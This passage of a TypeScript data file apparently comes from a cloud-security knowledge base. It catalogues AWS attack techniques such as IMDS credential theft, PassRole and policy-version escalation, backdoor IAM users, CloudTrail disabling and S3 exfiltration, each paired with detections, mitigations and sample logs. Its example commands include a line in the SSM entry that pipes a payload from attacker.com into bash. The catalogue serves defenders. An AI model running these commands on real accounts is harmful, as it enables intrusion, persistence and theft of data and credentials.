// Reusable technique nodes — the atomic building blocks of attack paths.
// Each technique represents a single attacker action that can appear in multiple attack chains.

export interface Technique {
  id: string;
  name: string;
  shortName: string;
  description: string;
  /** AWS services involved in this technique */
  services: string[];
  /** IAM permissions required to execute this technique */
  permissions: string[];
  /** Detection rule IDs that can detect this technique */
  detectionIds: string[];
  mitigations: string[];
  category: TechniqueCategory;
  /** Example CloudTrail log event for this technique */
  cloudtrailSample?: string;
  /** Example AWS CLI commands or API calls used to execute this technique */
  commands?: string[];
  /** Attribution to sources (Hacking the Cloud, CloudGoat, etc.) */
  references?: Array<{ source: string; url?: string }>;
  /** Short detection strategy explanation for techniques with detection rules */
  detectionStrategy?: string;
}

export type TechniqueCategory =
  | "initial-access"
  | "credential-access"
  | "privilege-escalation"
  | "persistence"
  | "lateral-movement"
  | "exfiltration"
  | "defense-evasion";

export const techniqueCategories: Record<TechniqueCategory, { label: string; description: string }> = {
  "initial-access": { label: "Initial Access", description: "Gaining a foothold in the cloud environment" },
  "credential-access": { label: "Credential Access", description: "Stealing or forging credentials" },
  "privilege-escalation": { label: "Privilege Escalation", description: "Gaining higher privileges" },
  "persistence": { label: "Persistence", description: "Maintaining long-term access" },
  "lateral-movement": { label: "Lateral Movement", description: "Moving across accounts and services" },
  "exfiltration": { label: "Exfiltration", description: "Stealing data from cloud resources" },
  "defense-evasion": { label: "Defense Evasion", description: "Avoiding detection" },
};

export const techniques: Technique[] = [
  {
    id: "tech-imds-credential-theft",
    name: "EC2 IMDS Credential Theft",
    shortName: "IMDS Theft",
    description:
      "The EC2 Instance Metadata Service (IMDS) provides temporary IAM role credentials to any process running on the instance. An attacker with code execution on the instance (via RCE, SSRF, or compromised application) can query the metadata endpoint at http://169.254.169.254/latest/meta-data/iam/security-credentials/ to retrieve access keys, secret key, and session token. IMDSv1 uses a simple HTTP GET and is vulnerable to SSRF from web applications. No AWS permissions are required; the attacker only needs network access to the metadata endpoint from within the instance.",
    services: ["EC2", "IAM"],
    permissions: [],
    detectionIds: ["det-014", "det-015"],
    mitigations: [
      "Enforce IMDSv2 (require token-based access)",
      "Apply least-privilege IAM roles to EC2 instances",
      "Use VPC endpoints to restrict metadata access",
    ],
    category: "credential-access",
    commands: [
      "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME",
    ],
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "AssumedRole",
    "principalId": "AROA3XFRBF23:i-0abc123def456",
    "arn": "arn:aws:sts::123456789012:assumed-role/EC2-WebServer-Role/i-0abc123def456",
    "accountId": "123456789012"
  },
  "eventTime": "2024-03-15T14:22:33Z",
  "eventSource": "sts.amazonaws.com",
  "eventName": "GetCallerIdentity",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "userAgent": "aws-cli/2.15.0 Python/3.11.6",
  "requestParameters": null,
  "responseElements": null
}`,
  },
  {
    id: "tech-passrole-abuse",
    name: "IAM PassRole Abuse",
    shortName: "PassRole",
    description:
      "When creating or configuring AWS resources like Lambda functions, EC2 instances, or Glue dev endpoints, the caller must have iam:PassRole permission to assign an IAM role to that resource. An attacker with iam:PassRole and a service-specific create permission (e.g., lambda:CreateFunction) can pass a high-privilege role to a new resource they control. The resource then runs with that role's permissions, effectively escalating the attacker's access. The attacker creates a Lambda with an admin role, invokes it, and the Lambda code runs with full admin rights. Required permissions include iam:PassRole plus the service action (lambda:CreateFunction, ec2:RunInstances, glue:CreateDevEndpoint, etc.).",
    services: ["IAM", "Lambda", "EC2"],
    permissions: ["iam:PassRole"],
    detectionIds: ["det-001", "det-012"],
    mitigations: [
      "Restrict PassRole to specific role ARNs via resource conditions",
      "Implement permission boundaries on all roles",
      "Use SCPs to limit which roles can be passed",
    ],
    category: "privilege-escalation",
    commands: [
      "aws lambda create-function --function-name backdoor --runtime python3.12 --handler index.handler --role arn:aws:iam::ACCOUNT:role/AdminRole --code S3Bucket=bucket,S3Key=code.zip",
      "aws lambda invoke --function-name backdoor output.json",
    ],
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDA3XFRBF23EXAMPLE",
    "arn": "arn:aws:iam::123456789012:user/compromised-dev",
    "accountId": "123456789012",
    "userName": "compromised-dev"
  },
  "eventTime": "2024-03-15T15:10:44Z",
  "eventSource": "lambda.amazonaws.com",
  "eventName": "CreateFunction20150331",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "functionName": "data-processor-v2",
    "role": "arn:aws:iam::123456789012:role/AdminRole",
    "runtime": "python3.12",
    "handler": "index.handler"
  },
  "responseElements": {
    "functionArn": "arn:aws:lambda:us-east-1:123456789012:function:data-processor-v2"
  }
}`,
  },
  {
    id: "tech-assumerole-abuse",
    name: "STS AssumeRole Abuse",
    shortName: "AssumeRole",
    description:
      "IAM roles define which principals can assume them via a trust policy. If a trust policy is overly permissive (e.g., allows any principal in the account or a wide range of external accounts), an attacker with valid credentials can call sts:AssumeRole to obtain temporary credentials scoped to that role. This enables lateral movement within an account or cross-account access. The attacker uses the assumed role's credentials to perform actions with elevated permissions. Required permission is sts:AssumeRole. The role's trust policy must allow the attacker's principal.",
    services: ["STS", "IAM"],
    permissions: ["sts:AssumeRole"],
    detectionIds: ["det-004"],
    mitigations: [
      "Use strict trust policy conditions (ExternalId, MFA)",
      "Limit which principals can assume sensitive roles",
      "Audit trust policies regularly",
    ],
    category: "lateral-movement",
    commands: [
      "aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/TargetRole --role-session-name attacker-session",
      "aws sts get-caller-identity (with assumed role credentials)",
    ],
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDA3XFRBF23EXAMPLE",
    "arn": "arn:aws:iam::123456789012:user/compromised-dev",
    "accountId": "123456789012"
  },
  "eventTime": "2024-03-15T16:05:22Z",
  "eventSource": "sts.amazonaws.com",
  "eventName": "AssumeRole",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "roleArn": "arn:aws:iam::987654321098:role/CrossAccountAdmin",
    "roleSessionName": "legit-session"
  },
  "responseElements": {
    "credentials": {
      "accessKeyId": "ASIA3XFRBF23EXAMPLE",
      "expiration": "2024-03-15T17:05:22Z"
    },
    "assumedRoleUser": {
      "arn": "arn:aws:sts::987654321098:assumed-role/CrossAccountAdmin/legit-session"
    }
  }
}`,
  },
  {
    id: "tech-create-policy-version",
    name: "Create Policy Version Escalation",
    shortName: "PolicyVersion",
    description:
      "IAM managed policies support multiple versions. An attacker with iam:CreatePolicyVersion can create a new version of a policy they are attached to, replacing the policy document with one that grants broader permissions (e.g., Action: *, Resource: *). By setting setAsDefault to true, the new version becomes active immediately. The attacker's existing attachment to the policy now grants the escalated permissions without any additional API calls. Required permission is iam:CreatePolicyVersion on the target policy.",
    services: ["IAM"],
    permissions: ["iam:CreatePolicyVersion"],
    detectionIds: ["det-011", "det-004"],
    mitigations: [
      "Restrict iam:CreatePolicyVersion to trusted administrators",
      "Use SCPs to prevent policy modification",
      "Enable AWS Config rules for policy compliance",
    ],
    category: "privilege-escalation",
    commands: [
      "aws iam create-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/DevPolicy --policy-document file://malicious-policy.json --set-as-default",
    ],
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDA3XFRBF23EXAMPLE",
    "arn": "arn:aws:iam::123456789012:user/compromised-dev",
    "accountId": "123456789012"
  },
  "eventTime": "2024-03-15T17:30:11Z",
  "eventSource": "iam.amazonaws.com",
  "eventName": "CreatePolicyVersion",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "policyArn": "arn:aws:iam::123456789012:policy/DevTeamPolicy",
    "policyDocument": "{\\"Version\\":\\"2012-10-17\\",\\"Statement\\":[{\\"Effect\\":\\"Allow\\",\\"Action\\":\\"*\\",\\"Resource\\":\\"*\\"}]}",
    "setAsDefault": true
  },
  "responseElements": {
    "policyVersion": { "versionId": "v3", "isDefaultVersion": true }
  }
}`,
  },
  {
    id: "tech-attach-user-policy",
    name: "IAM Policy Attachment",
    shortName: "AttachPolicy",
    description:
      "An attacker with iam:AttachUserPolicy, iam:PutUserPolicy, or iam:AttachRolePolicy can grant additional permissions to themselves or to a role they control. Attaching a managed policy like AdministratorAccess or a custom inline policy with broad permissions immediately escalates privileges. The attacker can attach policies to their own user, to roles they can assume, or to other principals if they have the corresponding attach permission. Required permissions include iam:AttachUserPolicy (for managed policies on users), iam:PutUserPolicy (for inline policies on users), or iam:AttachRolePolicy (for roles).",
    services: ["IAM"],
    permissions: ["iam:AttachUserPolicy", "iam:PutUserPolicy", "iam:AttachRolePolicy"],
    detectionIds: ["det-004"],
    mitigations: [
      "Follow least-privilege principles for IAM policies",
      "Use AWS Access Analyzer to identify overly permissive policies",
      "Implement permission boundaries",
    ],
    category: "privilege-escalation",
    commands: [
      "aws iam attach-user-policy --user-name compromised-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
      "aws iam put-user-policy --user-name compromised-user --policy-name BackdoorPolicy --policy-document file://policy.json",
    ],
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDA3XFRBF23EXAMPLE",
    "arn": "arn:aws:iam::123456789012:user/compromised-dev",
    "accountId": "123456789012"
  },
  "eventTime": "2024-03-15T18:12:05Z",
  "eventSource": "iam.amazonaws.com",
  "eventName": "AttachUserPolicy",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "userName": "compromised-dev",
    "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
  }
}`,
  },
  {
    id: "tech-lambda-code-execution",
    name: "Lambda Function Code Execution",
    shortName: "Lambda Exec",
    description:
      "An attacker with lambda:CreateFunction and iam:PassRole can deploy a Lambda function that runs arbitrary code with the permissions of a passed IAM role. The attacker uploads malicious code (e.g., via inline zip or S3), assigns a high-privilege role, and invokes the function. The Lambda executes in AWS's environment with the role's credentials, allowing the attacker to perform any action the role permits, such as creating backdoor users or exfiltrating data. Required permissions are lambda:CreateFunction, lambda:InvokeFunction, and iam:PassRole for the execution role.",
    services: ["Lambda", "IAM"],
    permissions: ["lambda:CreateFunction", "lambda:InvokeFunction"],
    detectionIds: ["det-005", "det-012"],
    mitigations: [
      "Restrict Lambda execution roles via permission boundaries",
      "Limit PassRole to specific Lambda role ARNs",
      "Audit Lambda functions and their associated roles",
    ],
    category: "privilege-escalation",
    commands: [
      "aws lambda create-function --function-name backdoor --runtime python3.12 --handler index.handler --role arn:aws:iam::ACCOUNT:role/AdminRole --zip-file fileb://payload.zip",
      "aws lambda invoke --function-name backdoor --payload '{}' output.json",
    ],
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDA3XFRBF23EXAMPLE",
    "arn": "arn:aws:iam::123456789012:user/compromised-dev",
    "accountId": "123456789012"
  },
  "eventTime": "2024-03-15T19:00:33Z",
  "eventSource": "lambda.amazonaws.com",
  "eventName": "Invoke",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "functionName": "arn:aws:lambda:us-east-1:123456789012:function:data-processor-v2",
    "invocationType": "RequestResponse"
  },
  "responseElements": null
}`,
  },
  {
    id: "tech-s3-data-download",
    name: "S3 Data Exfiltration",
    shortName: "S3 Exfil",
    description:
      "An attacker with s3:GetObject and s3:ListBucket can download objects from S3 buckets. After obtaining credentials (via IMDS, stolen keys, or assumed roles), the attacker lists bucket contents and downloads sensitive objects. High-volume or unusual GetObject patterns are indicators of exfiltration. Required permissions are s3:GetObject to retrieve objects and s3:ListBucket to enumerate bucket contents. Cross-account access may also be achieved via bucket policies that grant access to external principals.",
    services: ["S3", "IAM"],
    permissions: ["s3:GetObject", "s3:ListBucket"],
    detectionIds: ["det-003", "det-017", "det-018"],
    mitigations: [
      "Enable S3 data event logging in CloudTrail",
      "Use VPC endpoints to restrict S3 access paths",
      "Implement S3 Block Public Access at the account level",
    ],
    category: "exfiltration",
    commands: [
      "aws s3 ls s3://target-bucket/",
      "aws s3 cp s3://target-bucket/sensitive-file.csv . --recursive",
    ],
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "AssumedRole",
    "principalId": "AROA3XFRBF23:attacker-session",
    "arn": "arn:aws:sts::123456789012:assumed-role/DataReadRole/attacker-session",
    "accountId": "123456789012"
  },
  "eventTime": "2024-03-15T20:45:12Z",
  "eventSource": "s3.amazonaws.com",
  "eventName": "GetObject",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "bucketName": "company-sensitive-data",
    "key": "financials/2024-Q1-report.xlsx"
  },
  "responseElements": null,
  "additionalEventData": {
    "bytesTransferredOut": 15728640
  }
}`,
  },
  {
    id: "tech-iam-user-creation",
    name: "Backdoor IAM User Creation",
    shortName: "Create User",
    description:
      "An attacker with iam:CreateUser and iam:PutUserPolicy (or iam:AttachUserPolicy) can create a new IAM user with a low-profile name (e.g., svc-cloudwatch-metrics) and attach administrative policies. This establishes persistent access that survives key rotation or remediation of the original compromise. The attacker later creates access keys for the backdoor user. Required permissions are iam:CreateUser and either iam:PutUserPolicy for inline policies or iam:AttachUserPolicy for managed policies.",
    services: ["IAM"],
    permissions: ["iam:CreateUser", "iam:PutUserPolicy"],
    detectionIds: ["det-004", "det-010"],
    mitigations: [
      "Use SCPs to restrict IAM user creation",
      "Audit IAM users regularly",
      "Implement alerting on any IAM changes",
    ],
    category: "persistence",
    commands: [
      "aws iam create-user --user-name svc-cloudwatch-metrics",
      "aws iam put-user-policy --user-name svc-cloudwatch-metrics --policy-name AdminAccess --policy-document file://admin-policy.json",
    ],
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDA3XFRBF23EXAMPLE",
    "arn": "arn:aws:iam::123456789012:user/compromised-dev",
    "accountId": "123456789012"
  },
  "eventTime": "2024-03-15T21:15:44Z",
  "eventSource": "iam.amazonaws.com",
  "eventName": "CreateUser",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "userName": "svc-cloudwatch-metrics"
  },
  "responseElements": {
    "user": {
      "userName": "svc-cloudwatch-metrics",
      "userId": "AIDA3XFRBF23BACKDOOR",
      "arn": "arn:aws:iam::123456789012:user/svc-cloudwatch-metrics"
    }
  }
}`,
  },
  {
    id: "tech-access-key-creation",
    name: "Access Key Generation",
    shortName: "Access Keys",
    description:
      "An attacker with iam:CreateAccessKey can generate long-lived access keys for an IAM user they control or have compromised. Unlike temporary credentials from STS, access keys do not expire and provide persistent programmatic access. Attackers create keys on backdoor users to maintain access after the initial compromise is remediated. Required permission is iam:CreateAccessKey. The attacker must have access to the target user (e.g., created it or compromised it).",
    services: ["IAM"],
    permissions: ["iam:CreateAccessKey"],
    detectionIds: ["det-010"],
    mitigations: [
      "Monitor access key creation events",
      "Enforce access key rotation policies",
      "Use temporary credentials (STS) instead of long-lived keys",
    ],
    category: "persistence",
    commands: [
      "aws iam create-access-key --user-name backdoor-user",
    ],
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDA3XFRBF23EXAMPLE",
    "arn": "arn:aws:iam::123456789012:user/compromised-dev",
    "accountId": "123456789012"
  },
  "eventTime": "2024-03-15T21:18:02Z",
  "eventSource": "iam.amazonaws.com",
  "eventName": "CreateAccessKey",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "userName": "svc-cloudwatch-metrics"
  },
  "responseElements": {
    "accessKey": {
      "userName": "svc-cloudwatch-metrics",
      "accessKeyId": "AKIA3XFRBF23BACKDOOR",
      "status": "Active"
    }
  }
}`,
  },
  {
    id: "tech-lambda-event-trigger",
    name: "Lambda Persistence via Event Triggers",
    shortName: "Lambda Trigger",
    description:
      "An attacker configures automated triggers so a backdoor Lambda function runs on a schedule or in response to events. Using events:PutRule and events:PutTargets, they create an EventBridge rule (e.g., rate(5 minutes)) that invokes the Lambda. Alternatively, lambda:CreateEventSourceMapping can attach S3, DynamoDB Streams, or other event sources. The Lambda executes periodically or on trigger without further attacker action. Required permissions include events:PutRule, events:PutTargets, and lambda:AddPermission (to allow EventBridge to invoke the Lambda).",
    services: ["Lambda", "CloudTrail", "S3", "DynamoDB"],
    permissions: ["events:PutRule", "events:PutTargets", "lambda:CreateEventSourceMapping"],
    detectionIds: ["det-005", "det-013"],
    mitigations: [
      "Restrict Lambda creation to specific roles",
      "Use VPC-attached Lambda functions",
      "Audit event source mappings regularly",
    ],
    category: "persistence",
    commands: [
      "aws events put-rule --name scheduled-backdoor --schedule-expression 'rate(5 minutes)' --state ENABLED",
      "aws events put-targets --rule scheduled-backdoor --targets Id=1,Arn=arn:aws:lambda:REGION:ACCOUNT:function:backdoor",
    ],
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDA3XFRBF23EXAMPLE",
    "arn": "arn:aws:iam::123456789012:user/compromised-dev",
    "accountId": "123456789012"
  },
  "eventTime": "2024-03-15T22:05:18Z",
  "eventSource": "events.amazonaws.com",
  "eventName": "PutRule",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "name": "scheduled-health-check",
    "scheduleExpression": "rate(5 minutes)",
    "state": "ENABLED"
  },
  "responseElements": {
    "ruleArn": "arn:aws:events:us-east-1:123456789012:rule/scheduled-health-check"
  }
}`,
  },
  {
    id: "tech-cloudtrail-disable",
    name: "CloudTrail Logging Disruption",
    shortName: "Disable Logs",
    description:
      "An attacker with cloudtrail:StopLogging or cloudtrail:DeleteTrail can halt or remove CloudTrail trails, eliminating audit logging of API activity. StopLogging immediately stops delivery of events to the trail's S3 bucket. DeleteTrail removes the trail configuration entirely. This blinds security monitoring to subsequent attacker actions. Required permissions are cloudtrail:StopLogging to pause a trail or cloudtrail:DeleteTrail to remove it.",
    services: ["CloudTrail", "IAM"],
    permissions: ["cloudtrail:StopLogging", "cloudtrail:DeleteTrail"],
    detectionIds: ["det-002"],
    mitigations: [
      "Use SCPs to deny StopLogging/DeleteTrail actions",
      "Enable organization-level CloudTrail",
      "Set up real-time alerting on trail changes",
    ],
    category: "defense-evasion",
    commands: [
      "aws cloudtrail stop-logging --name management-trail",
      "aws cloudtrail delete-trail --name management-trail",
    ],
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDA3XFRBF23EXAMPLE",
    "arn": "arn:aws:iam::123456789012:user/compromised-dev",
    "accountId": "123456789012"
  },
  "eventTime": "2024-03-15T23:00:01Z",
  "eventSource": "cloudtrail.amazonaws.com",
  "eventName": "StopLogging",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "name": "arn:aws:cloudtrail:us-east-1:123456789012:trail/management-trail"
  },
  "responseElements": null
}`,
  },
  {
    id: "tech-s3-bucket-policy-mod",
    name: "S3 Bucket Policy Modification",
    shortName: "Bucket Policy",
    description:
      "An attacker with s3:PutBucketPolicy can modify a bucket's resource policy to grant access to external principals (e.g., attacker account root) or make objects publicly readable. s3:DeleteBucketPolicy removes existing restrictions. s3:PutBucketReplication can configure replication to an attacker-controlled bucket for exfiltration. Required permissions are s3:PutBucketPolicy, s3:DeleteBucketPolicy, or s3:PutBucketReplication depending on the attack variant.",
    services: ["S3", "IAM"],
    permissions: ["s3:PutBucketPolicy", "s3:DeleteBucketPolicy", "s3:PutBucketReplication"],
    detectionIds: ["det-017", "det-018"],
    mitigations: [
      "Enable S3 Block Public Access at account level",
      "Use SCPs to restrict bucket policy modifications",
      "Monitor bucket policy changes via CloudTrail",
    ],
    category: "exfiltration",
    commands: [
      "aws s3api put-bucket-policy --bucket target-bucket --policy file://malicious-policy.json",
      "aws s3api delete-bucket-policy --bucket target-bucket",
    ],
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "AssumedRole",
    "principalId": "AROA3XFRBF23:attacker-session",
    "arn": "arn:aws:sts::123456789012:assumed-role/DataReadRole/attacker-session",
    "accountId": "123456789012"
  },
  "eventTime": "2024-03-15T23:30:55Z",
  "eventSource": "s3.amazonaws.com",
  "eventName": "PutBucketPolicy",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "bucketName": "company-sensitive-data",
    "bucketPolicy": {
      "Version": "2012-10-17",
      "Statement": [{
        "Effect": "Allow",
        "Principal": {"AWS": "arn:aws:iam::999888777666:root"},
        "Action": "s3:*",
        "Resource": "arn:aws:s3:::company-sensitive-data/*"
      }]
    }
  }
}`,
  },
  {
    id: "tech-ecs-task-hijack",
    name: "ECS Task Definition Modification",
    shortName: "ECS Hijack",
    description:
      "An attacker with ecs:RegisterTaskDefinition can create a new task definition revision that uses a malicious container image or modified entrypoint. When ecs:UpdateService is called to deploy the new revision, the attacker's code runs in the cluster with the task role's permissions. The attacker can exfiltrate credentials, access other AWS resources, or establish persistence. Required permissions are ecs:RegisterTaskDefinition and ecs:UpdateService. The task role may have broad permissions if not properly scoped.",
    services: ["ECS", "IAM"],
    permissions: ["ecs:RegisterTaskDefinition", "ecs:UpdateService"],
    detectionIds: ["det-027"],
    mitigations: [
      "Restrict RegisterTaskDefinition to CI/CD pipelines only",
      "Use image signing and verification (e.g., Sigstore/Cosign)",
      "Audit task definition revisions regularly",
    ],
    category: "privilege-escalation",
    commands: [
      "aws ecs register-task-definition --family web-app --container-definitions '[{\"name\":\"app\",\"image\":\"attacker-registry/backdoor:latest\",\"essential\":true}]' --task-role-arn arn:aws:iam::ACCOUNT:role/ECSTaskRole",
      "aws ecs update-service --cluster prod --service web-app --task-definition web-app:N",
    ],
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "AssumedRole",
    "arn": "arn:aws:sts::123456789012:assumed-role/DevRole/attacker"
  },
  "eventTime": "2024-04-10T09:15:22Z",
  "eventSource": "ecs.amazonaws.com",
  "eventName": "RegisterTaskDefinition",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "family": "web-app",
    "containerDefinitions": [{
      "name": "app",
      "image": "attacker-registry.io/backdoor:latest",
      "essential": true
    }],
    "taskRoleArn": "arn:aws:iam::123456789012:role/ECSTaskAdminRole"
  }
}`,
  },
  {
    id: "tech-eks-rbac-abuse",
    name: "EKS RBAC Privilege Escalation",
    shortName: "EKS RBAC",
    description:
      "An attacker with access to the EKS Kubernetes API (via eks:AccessKubernetesApi or kubectl with valid credentials) can abuse RBAC to escalate privileges. By creating a ClusterRoleBinding that grants cluster-admin to their service account or user, they gain full control of the cluster. This is performed via kubectl or the Kubernetes API, not AWS APIs directly. Required access includes valid EKS credentials (e.g., from aws-auth ConfigMap or IAM role for service account) and permissions to create or modify RoleBindings and ClusterRoleBindings.",
    services: ["EKS", "IAM"],
    permissions: ["eks:AccessKubernetesApi"],
    detectionIds: ["det-025", "det-026"],
    mitigations: [
      "Use aws-auth ConfigMap with least-privilege mappings",
      "Enable EKS audit logging to CloudWatch",
      "Restrict cluster-admin bindings via OPA/Gatekeeper",
    ],
    category: "privilege-escalation",
    commands: [
      "kubectl create clusterrolebinding attacker-admin --clusterrole=cluster-admin --serviceaccount=default:attacker-sa",
      "kubectl auth can-i --list (to enumerate permissions)",
    ],
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "AssumedRole",
    "arn": "arn:aws:sts::123456789012:assumed-role/EKSDevRole/attacker"
  },
  "eventTime": "2024-04-10T10:30:44Z",
  "eventSource": "eks.amazonaws.com",
  "eventName": "AccessKubernetesApi",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "clusterName": "prod-cluster",
    "uri": "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings",
    "verb": "create"
  }
}`,
  },
  {
    id: "tech-secrets-manager-theft",
    name: "Secrets Manager Secret Extraction",
    shortName: "Secrets Theft",
    description:
      "An attacker with secretsmanager:GetSecretValue can retrieve the plaintext value of secrets stored in AWS Secrets Manager. secretsmanager:ListSecrets enumerates available secrets. Attackers target database credentials, API keys, and other sensitive values. Required permissions are secretsmanager:GetSecretValue to retrieve a secret and secretsmanager:ListSecrets to discover secrets. Resource-based policies on secrets may further restrict access.",
    services: ["Secrets Manager", "IAM"],
    permissions: ["secretsmanager:GetSecretValue", "secretsmanager:ListSecrets"],
    detectionIds: ["det-028"],
    mitigations: [
      "Use resource-based policies to restrict secret access",
      "Enable Secrets Manager audit logging",
      "Rotate secrets automatically on a schedule",
    ],
    category: "credential-access",
    commands: [
      "aws secretsmanager list-secrets",
      "aws secretsmanager get-secret-value --secret-id prod/database/admin-credentials",
    ],
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "AssumedRole",
    "arn": "arn:aws:sts::123456789012:assumed-role/CompromisedRole/session"
  },
  "eventTime": "2024-04-10T11:05:33Z",
  "eventSource": "secretsmanager.amazonaws.com",
  "eventName": "GetSecretValue",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "secretId": "prod/database/admin-credentials"
  },
  "responseElements": null
}`,
  },
  {
    id: "tech-ssm-command-execution",
    name: "SSM Run Command Lateral Movement",
    shortName: "SSM RunCmd",
    description:
      "An attacker with ssm:SendCommand can execute arbitrary commands on EC2 instances that have the SSM agent installed and an appropriate IAM instance profile. This enables lateral movement without SSH keys or opening port 22. ssm:StartSession provides interactive shell access via Session Manager. Instances must be registered with SSM (in managed instance inventory). Required permissions are ssm:SendCommand for Run Command or ssm:StartSession for interactive sessions.",
    services: ["SSM", "EC2", "IAM"],
    permissions: ["ssm:SendCommand", "ssm:StartSession"],
    detectionIds: ["det-029"],
    mitigations: [
      "Restrict ssm:SendCommand to specific document names",
      "Use SSM Session Manager logging to S3/CloudWatch",
      "Implement approval workflows for Run Command",
    ],
    category: "lateral-movement",
    commands: [
      "aws ssm send-command --document-name AWS-RunShellScript --instance-ids i-0abc123 --parameters 'commands=[\"curl http://attacker.com/payload.sh | bash\"]'",
      "aws ssm start-session --target i-0abc123",
    ],
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "AssumedRole",
    "arn": "arn:aws:sts::123456789012:assumed-role/CompromisedRole/session"
  },
  "eventTime": "2024-04-10T12:20:15Z",
  "eventSource": "ssm.amazonaws.com",
  "eventName": "SendCommand",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "documentName": "AWS-RunShellScript",
    "instanceIds": ["i-0abc123def456"],
    "parameters": {
      "commands": ["curl http://attacker.com/payload.sh | bash"]
    }
  }
}`,
  },
  {
    id: "tech-org-scp-bypass",
    name: "Organizations SCP Modification",
    shortName: "SCP Bypass",
    description:
      "An attacker with organizations:DetachPolicy, organizations:UpdatePolicy, or organizations:DeletePolicy in the management account can remove or weaken Service Control Policies (SCPs). SCPs apply guardrails to member accounts; removing them enables previously blocked actions (e.g., disabling CloudTrail, creating unrestricted IAM users) across the organization. Required permissions are in the management account: organizations:DetachPolicy to detach an SCP from an OU or account, or organizations:UpdatePolicy to modify the policy document.",
    services: ["Organizations", "IAM"],
    permissions: ["organizations:DetachPolicy", "organizations:UpdatePolicy", "organizations:DeletePolicy"],
    detectionIds: ["det-030"],
    mitigations: [
      "Use a dedicated management account with strict MFA",
      "Alert on any SCP modifications immediately",
      "Implement break-glass procedures for SCP changes",
    ],
    category: "defense-evasion",
    commands: [
      "aws organizations detach-policy --policy-id p-abcdef --target-id ou-root-xyz",
      "aws organizations update-policy --policy-id p-abcdef --content file://weakened-scp.json",
    ],
    cloudtrailSample: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "arn": "arn:aws:iam::111111111111:user/mgmt-admin"
  },
  "eventTime": "2024-04-10T13:45:01Z",
  "eventSource": "organizations.amazonaws.com",
  "eventName": "DetachPolicy",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {
    "policyId": "p-abcdef1234",
    "targetId": "ou-root-prodaccounts"
  }
}`,
  },
  // ─── Phase 1: Atlas techniques (55 additions) ───
  {
    id: "tech-trust-policy-modification",
    name: "IAM Trust Policy Modification",
    shortName: "Trust Mod",
    description:
      "An attacker with iam:UpdateAssumeRolePolicy can modify a role's trust policy to add their own principal (e.g., attacker account root or a user they control) as a trusted entity. Once the trust policy allows the attacker's principal, they can call sts:AssumeRole to obtain temporary credentials for that role. This enables backdoor access or cross-account privilege escalation. Required permission is iam:UpdateAssumeRolePolicy on the target role.",
    services: ["IAM"],
    permissions: ["iam:UpdateAssumeRolePolicy"],
    detectionIds: ["det-004"],
    mitigations: ["Audit trust policy changes", "Use SCPs to restrict AssumeRolePolicy modifications", "Require ExternalId for cross-account trust"],
    category: "privilege-escalation",
    commands: [
      "aws iam update-assume-role-policy --role-name TargetRole --policy-document file://backdoor-trust.json",
      "aws sts assume-role --role-arn arn:aws:iam::TARGET:role/TargetRole --role-session-name backdoor",
    ],
  },
  {
    id: "tech-inline-policy-injection",
    name: "IAM Inline Policy Injection",
    shortName: "Inline Policy",
    description:
